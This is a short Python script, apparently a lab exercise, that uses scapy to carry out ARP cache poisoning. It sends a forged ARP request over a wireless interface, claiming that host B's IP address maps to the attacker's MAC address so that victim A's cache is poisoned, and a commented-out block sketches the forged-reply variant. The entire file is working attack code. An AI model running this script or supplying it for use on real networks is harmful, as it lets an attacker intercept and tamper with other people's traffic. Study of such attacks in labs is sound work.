from scapy.all import Ether, ARP, sendp
import time


M_IP = "10.10.13.48"
M_MAC = "bc:17:b8:3f:ed:8c"
A_IP = "10.222.178.246"
A_MAC = "10:68:38:3e:51:ab"
B_IP = "10.10.13.99"


# arp request to poison A's cache
arp_req = Ether(dst=A_MAC) / ARP(
    op=1,           # request
    psrc=B_IP,      # who is asking
    hwsrc=M_MAC,    # sender mac
    pdst=A_IP,      # target IP (or do broadcast)
    hwdst=A_MAC     # target MAC (optional)
)

sendp(arp_req, iface="wlan0")



# arp_rep = Ether(dst=A_MAC) / ARP(
#     op=2,                # reply
#     psrc="B_IP",  # sender IP = B's IP
#     hwsrc=M_MAC,         # sender MAC = M's MAC
#     pdst=A_IP,           # target IP = A's IP
#     hwdst=A_MAC          # target MAC = A's MAC
# )



